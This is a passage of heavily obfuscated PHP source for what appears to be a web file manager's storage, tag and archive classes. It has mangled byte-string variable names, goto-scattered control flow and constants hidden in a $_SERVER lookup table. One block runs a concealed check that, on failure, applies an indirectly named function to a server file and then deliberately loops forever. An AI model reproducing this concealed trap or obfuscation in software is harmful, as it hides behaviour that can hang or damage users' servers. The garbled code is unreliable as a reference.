$_SERVER[¥Ÿ©ÒèÌ]; $ŸÓüÅ³É = $this->parse($ñ’ÚºúØ); $ñ’ÚºúØ = $ŸÓüÅ³É[$Ô¾À­€[401]]; for ($¾§âŸ¤µ = 0; $¾§âŸ¤µ < count($ŸÓüÅ³É[$Ô¾À­€[1312]]); $¾§âŸ¤µ++) { $·§ºæğÔ = $ŸÓüÅ³É[$Ô¾À­€[1312]][$¾§âŸ¤µ]; $ñ’ÚºúØ = $this->model->mkdir($ñ’ÚºúØ, $·§ºæğÔ, $Õëú—ç¢); } return $this->getPathOuter($ñ’ÚºúØ); } public function copyFile($øåÏŒÂ¼, $’ºù‹Ïş, $ü‚·’›„ = REPEAT_REPLACE) { $¼ĞË˜«µ =& $_SERVER[¥Ÿ©ÒèÌ]; $˜Ÿæã§¸ = $this->parse($’ºù‹Ïş); $ı íÖ¸¶ = $this->model->copy($øåÏŒÂ¼, $˜Ÿæã§¸[$¼ĞË˜«µ[401]], $ü‚·’›„, $˜Ÿæã§¸[$¼ĞË˜«µ[78]]); return $ı íÖ¸¶ ? $this->getPathOuter($ı íÖ¸¶) : !1; } public function moveFile($ÆÖ¤Š›¬, $©ìş‚­œ, $›¾’´Õš = REPEAT_REPLACE) { $‰ÚØ„ğŒ =& $_SERVER[¥Ÿ©ÒèÌ]; $†èİ««ü = $this->parse($©ìş‚­œ); $ã©ûÉÓŠ = $this->model->move($ÆÖ¤Š›¬, $†èİ««ü[$‰ÚØ„ğŒ[401]], $›¾’´Õš, $†èİ««ü[$‰ÚØ„ğŒ[78]]); return $ã©ûÉÓŠ ? $this->getPathOuter($ã©ûÉÓŠ) : !1; } public function copy($‡ã¢—ñë, $˜ñëñ²÷, $·Ôßûù¿ = REPEAT_REPLACE, $×ó‰ØÑ± = false) { $Êú–‰Ë¤ = $this->parse($˜ñëñ²÷); $°üë¥³€ = $this->model->copy($‡ã¢—ñë, $Êú–‰Ë¤[$_SERVER[¥Ÿ©ÒèÌ][401]], $·Ôßûù¿, $×ó‰ØÑ±); return $°üë¥³€ ? $this->getPathOuter($°üë¥³€) : !1; } public function moveSameAllow() { } public function move($Öœ—ş·á, $âÜ°˜¶ö, $Í¢Ğ³è = REPEAT_REPLACE, $Ï‚€ï™Ç = false) { $×–Çœ« = $this->parse($âÜ°˜¶ö); $úØğ÷—× = $this->model->move($Öœ—ş·á, $×–Çœ«[$_SERVER[¥Ÿ©ÒèÌ][401]], $Í¢Ğ³è, $Ï‚€ï™Ç); return $úØğ÷—× ? $this->getPathOuter($úØğ÷—×) : !1; } public function remove($ùÕ“ùŸŒ, $ô§È°œ® = true) { return $this->model->remove($ùÕ“ùŸŒ, $ô§È°œ®); } public function rename($–Ôš³ ˆ, $Æê§œêİ) { $×Ù‹Ë˜ã = $this->model->rename($–Ôš³ ˆ, $Æê§œêİ); return $×Ù‹Ë˜ã ? $this->getPathOuter($–Ôš³ ˆ) : $×Ù‹Ë˜ã; } public function size($ŒÛñ•€©) { $·ú¹ĞÏ = $this->infoSimple($ŒÛñ•€©); return $·ú¹ĞÏ ? $·ú¹ĞÏ[$_SERVER[¥Ÿ©ÒèÌ][80]] : 0; } public function infoSimple($‰Üº¥ñ¾) { return $this->model->sourceInfo($‰Üº¥ñ¾); } public function info($ö¹½¢µ) { return $this->infoParse($ö¹½¢µ); } public function infoAuth($‰Š½½) { return $this->infoParse($‰Š½½, !1, !0); } public function infoWithChildren($æÁ˜Íûí) { return $this->infoParse($æÁ˜Íûí, !0); } protected function infoParse($˜½µã—Ï, $ñ™÷¶ú§ = false, $ôÆ¢“› = false) { if (!$ñ™÷¶ú§) { return $this->model->pathInfo($˜½µã—Ï, $ôÆ¢“›); } return $this->model->pathInfoMore($˜½µã—Ï); } public function infoFull($Û»îµëü) { $–ªè™Š =& $_SERVER[¥Ÿ©ÒèÌ]; $“óõĞ˜Ê = explode($–ªè™Š[8], $Û»îµëü); $ÔôÍ¾Ó… = implode($–ªè™Š[8], array_splice($“óõĞ˜Ê, 1)); return $this->model->pathInfoByPath($“óõĞ˜Ê[0], $ÔôÍ¾Ó…); } public function hashSimple($ıÁ¬ÛôÈ) { $…«ˆ¿÷ =& $_SERVER[¥Ÿ©ÒèÌ]; $²Ìñ çÃ = $this->infoWithChildren($ıÁ¬ÛôÈ); return $²Ìñ çÃ[$…«ˆ¿÷[163]][$…«ˆ¿÷[170]]; } public function hashMd5($º¾ø’ª¸) { $¥Şôã¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ÿâôº¨ = $this->infoWithChildren($º¾ø’ª¸); return $Ÿâôº¨[$¥Şôã¬[163]][$¥Şôã¬[169]]; } public function exist($¢ØòÓ†) { $‚õ ¹ï =& $_SERVER[¥Ÿ©ÒèÌ]; $öŸ×Ğˆ½ = $this->parse($¢ØòÓ†); if (!$öŸ×Ğˆ½[$‚õ ¹ï[78]]) { return $this->isFile($¢ØòÓ†) || $this->isFolder($¢ØòÓ†); } $®¤Øã·ä = array($‚õ ¹ï[402] => $öŸ×Ğˆ½[$‚õ ¹ï[401]], $‚õ ¹ï[32] => $öŸ×Ğˆ½[$‚õ ¹ï[78]]); $ÅÁ‰îù = $this->model->where($®¤Øã·ä)->find(); return $ÅÁ‰îù ? !0 : !1; } public function isFile($êĞİ–ü…) { $¾óÌ¡¼â =& $_SERVER[¥Ÿ©ÒèÌ]; $‰õ§õ† = $this->infoSimple($êĞİ–ü…); return $‰õ§õ† && $‰õ§õ†[$¾óÌ¡¼â[411]] == $¾óÌ¡¼â[89] ? !1 : !0; } public function isFolder($æîáßÄâ) { $Œã½Ãğø =& $_SERVER[¥Ÿ©ÒèÌ]; $”ÃôŞ½Ã = $this->infoSimple($æîáßÄâ); return $”ÃôŞ½Ã && $”ÃôŞ½Ã[$Œã½Ãğø[411]] == $Œã½Ãğø[89] ? !0 : !1; } public function listPath($ÛİâªÖÜ, $‰”‹°Å¶ = false) { $™™€ºõ¶ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ÛİâªÖÜ == $™™€ºõ¶[12]) { return !1; } $®û›—Ï¥ = array($™™€ºõ¶[402] => $ÛİâªÖÜ); if ($‰”‹°Å¶) { return $this->model->listSource($®û›—Ï¥, -1); } return $this->model->listSource($®û›—Ï¥); } public function has($‚¾‘–Ø‡, $°ëí¨Ö = false, $»Ş¸·˜ˆ = null) { $÷ë¹Ü¦ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ş¬èéØû = $this->infoWithChildren($‚¾‘–Ø‡); if ($°ëí¨Ö) { return array($÷ë¹Ü¦[203] => $Ş¬èéØû[$÷ë¹Ü¦[203]], $÷ë¹Ü¦[202] => $Ş¬èéØû[$÷ë¹Ü¦[202]]); } return $»Ş¸·˜ˆ ? $Ş¬èéØû[$÷ë¹Ü¦[203]] : $Ş¬èéØû[$÷ë¹Ü¦[202]]; } public function listAll($êÅ· á) { $åóØş¨Ğ = IO::info($this->pathParse[$_SERVER[¥Ÿ©ÒèÌ][78]]); if (!$åóØş¨Ğ) { return array(); } return $this->model->listAll($êÅ· á); } public function getContent($¡”àù“½) { return $this->model->getContent($¡”àù“½); } public function setContent($øæÏªÔß, $š°ÒËƒ¼ = '') { return $this->model->setContent($øæÏªÔß, $š°ÒËƒ¼); } public function fileSubstr($ìİ–Şßİ, $’©×ÎĞÈ, $²¸Ëä„Á) { return $this->model->fileSubstr($ìİ–Şßİ, $’©×ÎĞÈ, $²¸Ëä„Á); } public function download($Üú¿†öá, $¼æÃ¢Ş = '') { $¥±å’Ú = get_path_father($¼æÃ¢Ş); $ŒšÎËûÂ = get_path_this($¼æÃ¢Ş); $ÒÁ‹şÛ¾ = $this->model->fileInfoGet($Üú¿†öá); $Ç¤‚æ³˜ = IO::copy($ÒÁ‹şÛ¾[$_SERVER[¥Ÿ©ÒèÌ][78]], $¥±å’Ú, !1, $ŒšÎËûÂ); return $Ç¤‚æ³˜; } public function setModifyTime($·åÚ¼’Ï, $©›ÎÛ = '') { $çğ­¬˜ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$·åÚ¼’Ï) { return; } $this->model->where(array($çğ­¬˜[418] => $·åÚ¼’Ï))->save(array($çğ­¬˜[86] => $©›ÎÛ)); } public function upload($áÍŠ›·ş, $†³ÏİÌÅ, $øŞ¢ß¡î = false, $¾äë·ö† = REPEAT_REPLACE) { $ÆöÀ¤‘ =& $_SERVER[¥Ÿ©ÒèÌ]; $Û™„êÊê = $this->parse($áÍŠ›·ş); $Íšâ÷åõ = $this->model->addFile($Û™„êÊê[$ÆöÀ¤‘[401]], $†³ÏİÌÅ, $Û™„êÊê[$ÆöÀ¤‘[78]], $øŞ¢ß¡î, $¾äë·ö†); return $this->getPathOuter($Íšâ÷åõ); } public function uploadFileByID($Ü¡®õîŠ, $«¸“½‹¹, $Üœñ…¨) { $Û“ª¿üÌ =& $_SERVER[¥Ÿ©ÒèÌ]; $×ı×ÄÀ• = $this->parse($Ü¡®õîŠ); $²Ëã‡ù· = $this->model->addFileByFileID($×ı×ÄÀ•[$Û“ª¿üÌ[401]], $«¸“½‹¹, $×ı×ÄÀ•[$Û“ª¿üÌ[78]], $Üœñ…¨); return $this->getPathOuter($²Ëã‡ù·); } public function addFileByRemote($óåÆ¾Šè, $šÓŒ½ğØ, $¸ÎşÎº = array(), $š­¯ãš¹ = '', $”’Á§ßª) { $¶¥Òß«¥ =& $_SERVER[¥Ÿ©ÒèÌ]; $ö‚¬ †ü = $this->parse($óåÆ¾Šè); $š­¯ãš¹ = empty($š­¯ãš¹) ? $ö‚¬ †ü[$¶¥Òß«¥[78]] : $š­¯ãš¹; $ò‰Æú±Û = $this->model->addFileByRemote($ö‚¬ †ü[$¶¥Òß«¥[401]], $šÓŒ½ğØ, $š­¯ãš¹, $¸ÎşÎº, $”’Á§ßª); return $this->getPathOuter($ò‰Æú±Û); } public function uploadLink($²¨Úâ·á, $èìôªÕ‹ = 0) { $”÷€•¯÷ =& $_SERVER[¥Ÿ©ÒèÌ]; $¸¢Ç„¬ª = $this->parse($²¨Úâ·á); $Ä‘ƒË°„ = _get($GLOBALS[$”÷€•¯÷[7]], $”÷€•¯÷[1313]); $ú¡ñÑëè = _get($GLOBALS[$”÷€•¯÷[7]], $”÷€•¯÷[1314]); $²¨Úâ·á = Model($”÷€•¯÷[603])->createFileName($¸¢Ç„¬ª[$”÷€•¯÷[78]], $Ä‘ƒË°„, $ú¡ñÑëè); return IO::uploadLink($²¨Úâ·á, $èìôªÕ‹); } public function fileNameAuto($¤›ÍªÂ², $«»Š§×œ, $Ä¶“ğŞ‘ = REPEAT_REPLACE, $ÌÔ´ÜîØ = false) { return $this->model->fileNameAuto($¤›ÍªÂ², $«»Š§×œ, $Ä¶“ğŞ‘, $ÌÔ´ÜîØ); } public function fileNameExist($œèéÒ™ö, $÷Ô’àº³) { return $this->model->fileNameExist($œèéÒ™ö, $÷Ô’àº³); } protected function _fileOut($¤üÇå£Ñ, $±ÌäŸú = false, $™×ç¶ñ¢ = false, $¯Ü¹”È = '', $ °Œ“ñÑ = false) { $ÃĞ°Üå =& $_SERVER[¥Ÿ©ÒèÌ]; $ÔÏœ©â = $this->model->sourceInfo($¤üÇå£Ñ); if ($ÔÏœ©â[$ÃĞ°Üå[411]] == $ÃĞ°Üå[89]) { header($ÃĞ°Üå[1315]); die; } $Å°¦õ™® = $this->model->fileInfoGet($¤üÇå£Ñ); $¯Ü¹”È = $Å°¦õ™®[$ÃĞ°Üå[169]] ? $Å°¦õ™®[$ÃĞ°Üå[169]] : $¯Ü¹”È; $¹Ğ Ó¡ = isset($GLOBALS[$ÃĞ°Üå[1316]]) ? $GLOBALS[$ÃĞ°Üå[1316]] : $ÔÏœ©â[$ÃĞ°Üå[32]]; if ($ °Œ“ñÑ) { return IO::fileOutServer($Å°¦õ™®[$ÃĞ°Üå[78]], $±ÌäŸú, $¹Ğ Ó¡, $¯Ü¹”È); } IO::fileOut($Å°¦õ™®[$ÃĞ°Üå[78]], $±ÌäŸú, $¹Ğ Ó¡, $¯Ü¹”È); } public function fileOut($—Ş§“áÊ, $¢ğÀö½í = false, $Ãï†¤³ = false, $ôß·ÒÙ… = '') { $this->_fileOut($—Ş§“áÊ, $¢ğÀö½í, $Ãï†¤³, $ôß·ÒÙ…); } public function fileOutServer($ï‰¦³Ôä, $õÀÂÌ¹ = false, $«´à• = false, $¸Óù½Ãè = '') { $this->_fileOut($ï‰¦³Ôä, $õÀÂÌ¹, $«´à•, $¸Óù½Ãè, !0); } protected function _fileOutImage($ÈÂüû÷¦, $Ç¤Æùñ‚ = 250) { $Í¦¬ø  =& $_SERVER[¥Ÿ©ÒèÌ]; $ÈúÖ¦Îç = $this->model->pathInfo($ÈÂüû÷¦); if ($ÈúÖ¦Îç[$Í¦¬ø [411]] == $Í¦¬ø [89]) { show_json($Í¦¬ø [1317] . $ÈÂüû÷¦, !1); } $Ñóı©­ = $this->model->fileInfoGet($ÈÂüû÷¦); $Ñóı©­[$Í¦¬ø [32]] = $ÈúÖ¦Îç[$Í¦¬ø [32]]; $Ñóı©­[$Í¦¬ø [162]] = $ÈúÖ¦Îç[$Í¦¬ø [162]]; $GLOBALS[$Í¦¬ø [1316]] = $Ñóı©­[$Í¦¬ø [32]]; $GLOBALS[$Í¦¬ø [161]] = $Ñóı©­; IO::fileOutImage($Ñóı©­[$Í¦¬ø [78]], $Ç¤Æùñ‚); } public function fileOutImage($ì »˜è, $»³’çïæ = 250) { $this->_fileOutImage($ì »˜è, $»³’çïæ); } public function fileOutImageServer($§’¼Ü—”, $÷²°£§õ = 250) { $this->_fileOutImage($§’¼Ü—”, $÷²°£§õ); } public function link($Ç»›»², $ÛÖ¥ãš = '') { $ÕÍ‰†Ğú = $this->model->fileInfoGet($Ç»›»²); return IO::link($ÕÍ‰†Ğú[$_SERVER[¥Ÿ©ÒèÌ][78]], $ÛÖ¥ãš); } protected function parse($¦‹Ì‹«ş) { $ÚÇèŸñ =& $_SERVER[¥Ÿ©ÒèÌ]; if (strstr($¦‹Ì‹«ş, $ÚÇèŸñ[8]) === !1) { return array($ÚÇèŸñ[420] => intval($¦‹Ì‹«ş), $ÚÇèŸñ[78] => $ÚÇèŸñ[12], $ÚÇèŸñ[1312] => array()); } $¶ºƒšÔ­ = explode($ÚÇèŸñ[8], trim($¦‹Ì‹«ş, $ÚÇèŸñ[8])); if (count($¶ºƒšÔ­) < 2) { show_tips(clear_html($¦‹Ì‹«ş) . $ÚÇèŸñ[1318]); } return array($ÚÇèŸñ[420] => intval($¶ºƒšÔ­[0]), $ÚÇèŸñ[78] => $¶ºƒšÔ­[1], $ÚÇèŸñ[1312] => array_slice($¶ºƒšÔ­, 1)); } } goto F‚Îòšƒëå; b­Àí²‰‘¼: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\x2e\x74\141\x67\x4c\151\x73\x74"; public $modelType = "\125\x73\145\162\117\x70\164\x69\157\x6e"; public $field = array("\x6e\x61\155\x65", "\163\164\x79\154\145", "\x73\x6f\162\x74"); public function listData($œï¯´¨Ã = false, $øû·½º = "\163\157\162\x74", $ëÏÇÜîİ = false) { return parent::listData($œï¯´¨Ã, $øû·½º, $ëÏÇÜîİ); } public function remove($µš³²€„) { return parent::remove($µš³²€„); } public function add($æå–ë´À, $¶ÂˆÀä = "\x6c\x61\142\x65\154\55\x67\162\x65\x79\55\x6e\157\x72\x6d\x61\154") { $¢«ò¶ªº =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->findByName($æå–ë´À)) { return !1; } $»ğĞƒ¬ = array($¢«ò¶ªº[421] => $æå–ë´À, $¢«ò¶ªº[484] => $¶ÂˆÀä, $¢«ò¶ªº[1811] => $this->getSort($¢«ò¶ªº[262]) + 1); return parent::insert($»ğĞƒ¬); } public function update($º¾Ñ‹›˜, $äó“µ‹ƒ) { $ĞÕïäëÙ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ó¡˜÷Éı = $this->listData($º¾Ñ‹›˜); $„‰‰‹ú“ = $this->findByName($äó“µ‹ƒ[$ĞÕïäëÙ[32]]); if (!$Ó¡˜÷Éı || $„‰‰‹ú“ && $„‰‰‹ú“[$ĞÕïäëÙ[401]] != $Ó¡˜÷Éı[$ĞÕïäëÙ[401]]) { return !1; } return parent::update($º¾Ñ‹›˜, $äó“µ‹ƒ); } public function moveTop($ù°Ëı°¢) { $ğ‡„Òî =& $_SERVER[¥Ÿ©ÒèÌ]; $ãÃ¾½ş¥ = parent::listData(); $ùÚ¼ñ˜Á = $this->getSort($ğ‡„Òî[261]); foreach ($ãÃ¾½ş¥ as &$éß–¥Ê) { if ($éß–¥Ê[$ğ‡„Òî[401]] == $ù°Ëı°¢) { $éß–¥Ê[$ğ‡„Òî[1830]] = $ùÚ¼ñ˜Á; continue; } $éß–¥Ê[$ğ‡„Òî[1830]] += 1; } unset($éß–¥Ê); return parent::resetData($ãÃ¾½ş¥); } public function moveBottom($˜ô±îÂï) { $±ÓÃ¨±£ =& $_SERVER[¥Ÿ©ÒèÌ]; $Èğú“ = $this->getSort($±ÓÃ¨±£[262]) + 1; return parent::update($˜ô±îÂï, array($±ÓÃ¨±£[1830] => $Èğú“)); } public function resetSort($ââŠˆ¢ƒ) { $ß‹³‘ =& $_SERVER[¥Ÿ©ÒèÌ]; $˜·û³Ìó = array(); $ââŠˆ¢ƒ = is_array($ââŠˆ¢ƒ) ? $ââŠˆ¢ƒ : array(); for ($ş°Â×€Ú = 0; $ş°Â×€Ú < count($ââŠˆ¢ƒ); $ş°Â×€Ú++) { $˜·û³Ìó[$ââŠˆ¢ƒ[$ş°Â×€Ú] . $ß‹³‘[12]] = $ş°Â×€Ú + 1; } $Ñ€õºç = parent::listData(); foreach ($Ñ€õºç as &$âı¥ü¼Ì) { $çéËüõ = $˜·û³Ìó[$âı¥ü¼Ì[$ß‹³‘[401]]]; $âı¥ü¼Ì[$ß‹³‘[1830]] = $çéËüõ ? $çéËüõ : $âı¥ü¼Ì[$ß‹³‘[1830]]; } unset($âı¥ü¼Ì); return parent::resetData($Ñ€õºç); } private function getSort($¼æ“®£ç) { $±¾œôãŠ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ÿï…¹¿¹ = parent::listData(); $±×©ºúÊ = array_to_keyvalue($Ÿï…¹¿¹, $±¾œôãŠ[12], $±¾œôãŠ[1830]); if (!$±×©ºúÊ) { $±×©ºúÊ = array(0); } $àùşêñØ = $¼æ“®£ç == $±¾œôãŠ[262] ? max($±×©ºúÊ) : min($±×©ºúÊ); return intval($àùşêñØ); } } goto e¯§®›İ¤Õ; DåÌÅó·¨µ: if (!isset($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][233]]) || !isset($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][241]])) { $_getc = $_SERVER[¥Ÿ©ÒèÌ][235]; $_getfile = $_SERVER[$_SERVER[¥Ÿ©ÒèÌ][236]] . $_SERVER[¥Ÿ©ÒèÌ][237]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥Ÿ©ÒèÌ][226], $_getfilec); if (count($_getarrs) < $_SERVER[¥Ÿ©ÒèÌ][238]) { $exit = $_SERVER[¥Ÿ©ÒèÌ][239]; $exit(); } $_act = $_SERVER[¥Ÿ©ÒèÌ][240]; $_act($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][236]] . $_SERVER[¥Ÿ©ÒèÌ][237]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¥Ÿ©ÒèÌ][382]); } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ó˜Ìº…¸; if (!$Ó˜Ìº…¸) { $‘Œ½Æ˜¶ = IO::init($_SERVER[¥Ÿ©ÒèÌ][8]); } return $‘Œ½Æ˜¶; } private static function iconvSystem($áåÔÖÎ¯) { return self::local()->iconvSystem($áåÔÖÎ¯); } private static function iconvApp($Ì”Ÿóµ½) { return self::local()->iconvApp($Ì”Ÿóµ½); } public static function zip($šŸ¾›åØ, $¨˜„ì½ç = "\x7a\x69\x70", $öó¬•û‡ = '', $µ¼â½”Ñ = REPEAT_RENAME) { $ï‚–íş‹ =& $_SERVER[¥Ÿ©ÒèÌ]; $ôØµ‚€‚ = self::init($šŸ¾›åØ[0][$ï‚–íş‹[78]]); $»Áğ¬´ = self::info($šŸ¾›åØ[0][$ï‚–íş‹[78]]); $­ÁÎõã¼ = !1; if (!$öó¬•û‡ && $ôØµ‚€‚->getType() == $ï‚–íş‹[107]) { $¼§İßèµ = self::zipFileList($šŸ¾›åØ); } else { $­ÁÎõã¼ = $öó¬•û‡ ? $öó¬•û‡ : TEMP_FILES . $ï‚–íş‹[1168] . time() . rand_string(8) . $ï‚–íş‹[8]; mk_dir($­ÁÎõã¼); $¼§İßèµ = self::zipFileList($šŸ¾›åØ, $­ÁÎõã¼); } $–Äâ©í· = $»Áğ¬´[$ï‚–íş‹[32]]; if (count($¼§İßèµ) > 1) { $ıŠÚÏ²Á = IO::info(IO::pathFather($»Áğ¬´[$ï‚–íş‹[78]])); $–Äâ©í· = $ıŠÚÏ²Á[$ï‚–íş‹[32]]; } $ƒŠÃ¡Ã = $­ÁÎõã¼; if (!$ƒŠÃ¡Ã) { $ƒŠÃ¡Ã = get_path_father($»Áğ¬´[$ï‚–íş‹[78]]); if (!$öó¬•û‡ && $ôØµ‚€‚->getType() == $ï‚–íş‹[107]) { $ƒŠÃ¡Ã = get_path_father($ôØµ‚€‚->path); } $ÚÛÆÔ»Ì = IO::info($ƒŠÃ¡Ã); if (!$ÚÛÆÔ»Ì[$ï‚–íş‹[195]]) { show_json(LNG($ï‚–íş‹[1169]), !1); } } $Å¡Ç¿—ù = $ƒŠÃ¡Ã . $–Äâ©í· . $ï‚–íş‹[10] . $¨˜„ì½ç; $Å¡Ç¿—ù = get_filename_auto($Å¡Ç¿—ù, $ï‚–íş‹[12], $µ¼â½”Ñ); $ŞÓŠ“¢Ç = self::iconvSystem($Å¡Ç¿—ù); foreach ($¼§İßèµ as $Á°…µ => $İÜÛÃİÚ) { $¼§İßèµ[$Á°…µ] = self::iconvSystem($İÜÛÃİÚ); } KodArchive::create($ŞÓŠ“¢Ç, $¼§İßèµ); if (!IO::exist($Å¡Ç¿—ù)) { if ($­ÁÎõã¼) { del_dir($­ÁÎõã¼); } show_json(LNG($ï‚–íş‹[1170]), !1); } if ($öó¬•û‡ || !$­ÁÎõã¼) { if ($­ÁÎõã¼ && strstr($­ÁÎõã¼, TEMP_FILES)) { $¶û¦²‡« = $¼§İßèµ = array(); recursion_dir($ƒŠÃ¡Ã, $¶û¦²‡«, $¼§İßèµ, 0); foreach ($¶û¦²‡« as $Âªƒ¾ˆØ) { del_dir($Âªƒ¾ˆØ); } foreach ($¼§İßèµ as $îŞÇÕÛ“) { if ($îŞÇÕÛ“ == $ŞÓŠ“¢Ç) { continue; } del_file($îŞÇÕÛ“); } } return $Å¡Ç¿—ù; } $‘²´›ã = self::pathFather($»Áğ¬´[$ï‚–íş‹[78]]); $‘øˆÆÃ = self::move($Å¡Ç¿—ù, $‘²´›ã, $µ¼â½”Ñ); if (!$‘øˆÆÃ) { del_dir($­ÁÎõã¼); show_json(LNG($ï‚–íş‹[1170]), !1); } del_dir($­ÁÎõã¼); return $‘øˆÆÃ; } public static function unzip($‹˜×™½û, $Œ¿˜İ = "\162\x65\x70\154\x61\x63\145") { $Ÿ³ÄùĞš =& $_SERVER[¥Ÿ©ÒèÌ]; $şàõÄ© = $‹˜×™½û[$Ÿ³ÄùĞš[78]]; $±Êéì˜Û = $‹˜×™½û[$Ÿ³ÄùĞš[1171]]; if (!($Õƒö¤ºÀ = parent::info($şàõÄ©))) { show_json(LNG($Ÿ³ÄùĞš[1172]), !1); } if (!($Ÿ«ÅÒéı = parent::infoFull($±Êéì˜Û))) { $±Êéì˜Û = parent::mkdir($±Êéì˜Û); $Ÿ«ÅÒéı = array($Ÿ³ÄùĞš[78] => $±Êéì˜Û); } else { if (isset($Ÿ«ÅÒéı[$Ÿ³ÄùĞš[403]]) && trim($Ÿ«ÅÒéı[$Ÿ³ÄùĞš[78]], $Ÿ³ÄùĞš[8]) != trim($±Êéì˜Û, $Ÿ³ÄùĞš[8])) { $ÁŒõÑúã = KodIO::make($Ÿ«ÅÒéı[$Ÿ³ÄùĞš[498]]); $´­âŸŞ = parent::fileNameAuto($ÁŒõÑúã, $Ÿ«ÅÒéı[$Ÿ³ÄùĞš[32]], REPEAT_RENAME_FOLDER, !0); $±Êéì˜Û = parent::mkdir($ÁŒõÑúã . $´­âŸŞ); $Ÿ«ÅÒéı = array($Ÿ³ÄùĞš[78] => $±Êéì˜Û); } } $±Êéì˜Û = $Ÿ«ÅÒéı[$Ÿ³ÄùĞš[78]]; $™²·Ñúï = self::tmpFileName($Õƒö¤ºÀ); $Ìà€ƒÆê = TEMP_FILES . $™²·Ñúï; del_dir($Ìà€ƒÆê); mk_dir($Ìà€ƒÆê); $£ò±¡¶Á = self::fileExt($Õƒö¤ºÀ); $Ûœæ¾üì = $Ìà€ƒÆê . $Ÿ³ÄùĞš[10] . $£ò±¡¶Á; if (!@file_exists(self::iconvSystem($Ûœæ¾üì))) { $üÄõ–£û = self::localFilePath($şàõÄ©, $£ò±¡¶Á); $Ûœæ¾üì = $üÄõ–£û ? $üÄõ–£û : parent::download($şàõÄ©, $Ûœæ¾üì); } $Ûœæ¾üì = self::iconvSystem($Ûœæ¾üì); $¯ƒÀ€½ï = isset($‹˜×™½û[$Ÿ³ÄùĞš[1173]]) ? $‹˜×™½û[$Ÿ³ÄùĞš[1173]] : $Ÿ³ÄùĞš[1174]; $”ãÂéå = KodArchive::extract($Ûœæ¾üì, $Ìà€ƒÆê . $Ÿ³ÄùĞš[8], $¯ƒÀ€½ï); self::archiveExt(); if (!$”ãÂéå[$Ÿ³ÄùĞš[1175]]) { show_json($Ÿ³ÄùĞš[1176] . $”ãÂéå[$Ÿ³ÄùĞš[1177]], !1); } Hook::trigger($Ÿ³ÄùĞš[1178], $Ìà€ƒÆê); recursion_dir($Ìà€ƒÆê, $¼ë²§¬», $·ìÙÊõÄ, 0); $²Êéİò = array_merge($¼ë²§¬», $·ìÙÊõÄ); foreach ($²Êéİò as $›ÕŞíª‘) { $›ÕŞíª‘ = self::iconvApp($›ÕŞíª‘); self::move($›ÕŞíª‘, $±Êéì˜Û, $Œ¿˜İ); } del_dir($Ìà€ƒÆê); if (!$üÄõ–£û) { del_file($Ûœæ¾üì); } return !0; } public static function unzipList($Èåêâ”—) { $ÓÏ³’§ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÅÏ¬øç = $Èåêâ”—[$ÓÏ³’§[78]]; $¸Şé•©Œ = isset($Èåêâ”—[$ÓÏ³’§[1179]]) ? $Èåêâ”—[$ÓÏ³’§[1179]] : -1; $åõğº¼à = 50000; if (request_url_safe($ÅÏ¬øç)) { $Ÿ¾ûä¿ = parse_url_query($ÅÏ¬øç); if (!isset($Ÿ¾ûä¿[$ÓÏ³’§[78]])) { show_json($ÓÏ³’§[1180], !1); } } $ÚĞ—¹ ß = isset($Ÿ¾ûä¿) ? $Ÿ¾ûä¿[$ÓÏ³’§[78]] : $ÅÏ¬øç; $¶šµÆ–º = self::info($ÚĞ—¹ ß); $µÆï¶”ç = self::fileExt($¶šµÆ–º); $šÀÑÅ¹ = self::tmpFileName($¶šµÆ–º); if (isset($Ÿ¾ûä¿)) { $ªÎ²óíä = array($Ÿ¾ûä¿[$ÓÏ³’§[78]], $Ÿ¾ûä¿[$ÓÏ³’§[1179]], $Ÿ¾ûä¿[$ÓÏ³’§[32]]); $·Ğ‰ÑÆ« = md5(implode($ÓÏ³’§[11], $ªÎ²óíä)) . $ÓÏ³’§[10] . get_path_ext($Ÿ¾ûä¿[$ÓÏ³’§[32]]); } else { $ªÎ²óíä = array($¶šµÆ–º[$ÓÏ³’§[32]], $¶šµÆ–º[$ÓÏ³’§[78]], $¶šµÆ–º[$ÓÏ³’§[80]]); $·Ğ‰ÑÆ« = md5(implode($ÓÏ³’§[11], $ªÎ²óíä)) . $ÓÏ³’§[10] . $µÆï¶”ç; } if ($¸Şé•©Œ == -1) { $ĞÀ°£õ… = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\x69\x65\x77\x2f{$šÀÑÅ¹}\x2f{$·Ğ‰ÑÆ«}\56\x6c\x6f\147"; $»ó§£Óø = self::infoFull($ĞÀ°£õ…); if ($»ó§£Óø) { $ĞÀ°£õ… = $»ó§£Óø[$ÓÏ³’§[78]]; $ùˆ¤“ˆ = self::getContent($ĞÀ°£õ…); if ($ùˆ¤“ˆ) { $ŠŠÜàšİ = json_decode($ùˆ¤“ˆ, !0); $ŠŠÜàšİ = is_array($ŠŠÜàšİ) ? $ŠŠÜàšİ : array(); if (count($ŠŠÜàšİ) >= $åõğº¼à) { show_json(sprintf(LNG($ÓÏ³’§[1181]), count($ŠŠÜàšİ)), !1); } return $ŠŠÜàšİ; } } else { $ĞÀ°£õ… = self::mkfile($ĞÀ°£õ…); } } $—Ô”¥´— = TEMP_FILES . $šÀÑÅ¹; if (!is_dir($—Ô”¥´—)) { mk_dir($—Ô”¥´—); } $±Òï¸¼ = $—Ô”¥´— . $ÓÏ³’§[8] . $·Ğ‰ÑÆ«; if (!@file_exists(self::iconvSystem($±Òï¸¼))) { if (isset($Ÿ¾ûä¿)) { url_request($ÅÏ¬øç, $ÓÏ³’§[1182], $±Òï¸¼); } else { $ŞÇ¤ˆ–ş = self::localFilePath($ÅÏ¬øç, $µÆï¶”ç); $±Òï¸¼ = $ŞÇ¤ˆ–ş ? $ŞÇ¤ˆ–ş : self::download($ÅÏ¬øç, $±Òï¸¼); } } $±Òï¸¼ = 